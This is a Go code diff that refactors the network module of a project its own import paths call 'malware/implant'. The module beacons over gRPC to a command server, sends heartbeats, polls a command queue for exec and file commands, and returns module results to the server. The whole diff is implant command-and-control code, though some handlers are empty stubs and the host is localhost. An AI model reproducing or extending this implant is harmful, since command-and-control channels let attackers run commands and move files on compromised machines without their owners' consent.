@@ -4,30 +4,23 @@ import (
 	"context"
 	"fmt"
 	"log"
-	"malware/common"
+	"malware/common/messages"
 	pb "malware/common/messages"
 	"malware/common/types"
+	"malware/implant/included_modules"
 	"time"
 
 	"google.golang.org/grpc"
 )
 
-const CAPABILITY = "network"
-
 type state struct {
-	running   bool
-	rxChannel chan types.Message
-	txChannel chan types.Message
-	grpc      *grpc.Server
+	running bool
+	grpc    *grpc.Server
 }
 
 type settings struct {
 	state *state
 	host  string
-}
-
-func (settings settings) Capability() string {
-	return CAPABILITY
 }
 
 func (settings settings) doConnection(conn *grpc.ClientConn) {
@@ -36,21 +29,19 @@ func (settings settings) doConnection(conn *grpc.ClientConn) {
 	defer cancel()
 
 	heartbeat := &pb.CheckCmdRequest_Heartbeat{Heartbeat: time.Now().Unix()}
-
+	fmt.Println("Sending heartbeat")
 	reply, err := client.CheckCommandQueue(ctx, &pb.CheckCmdRequest{Message: heartbeat})
+
 	if err != nil {
-		common.Panicf(err, "Sending heartbeat help broken")
+		fmt.Println("Sending heartbeat help broken", err)
+		return
 	}
 
-	switch u := reply.Message.(type) {
-	case *pb.CheckCmdReply_Heartbeat: // No commands to do rip
-		fmt.Println("Heartbeat", u.Heartbeat)
-	case *pb.CheckCmdReply_Exec:
-		fmt.Println("Exec reply", u.Exec)
-	case *pb.CheckCmdReply_File:
-		fmt.Println("Received file", u.File)
-	default:
-		common.Panic("Didn't receive a valid message", reply, u)
+	fmt.Println(reply)
+	for _, module := range included_modules.Modules {
+		module.HandleMessage(reply, func(reply *messages.ImplantReply) {
+			client.CheckCommandQueue(ctx, &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}})
+		})
 	}
 
 }
@@ -70,38 +61,23 @@ func (settings settings) listenServer() {
 	}
 }
 
-func (settings settings) runEvents() {
-	for settings.state.running {
-		message := <-settings.state.rxChannel
-
-		switch message.Capability {
-		case CAPABILITY:
-
-		default:
-			common.Panicf(nil, "Didn't receive CAPABILITY type, %v", message)
-		}
-
-	}
+func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.ImplantReply)) {
+	// Empty stub
 }
 
 func Create() types.Module {
 	port := int16(2000)
 	ip := "127.0.0.1"
-	state := state{rxChannel: nil, txChannel: nil}
+	state := state{}
 	host := fmt.Sprintf("%s:%d", ip, port)
 
 	return settings{&state, host}
 }
 
-func (settings settings) Init() types.Rx_Tx {
-	settings.state.rxChannel = make(chan types.Message, 1)
-	settings.state.txChannel = make(chan types.Message, 1)
+func (settings settings) Init() {
 	settings.state.running = true
 
-	go settings.listenServer()
-	go settings.runEvents()
-
-	return types.Rx_Tx{Rx: settings.state.rxChannel, Tx: settings.state.txChannel}
+	settings.listenServer()
 }
 
 func (settings settings) Shutdown() {
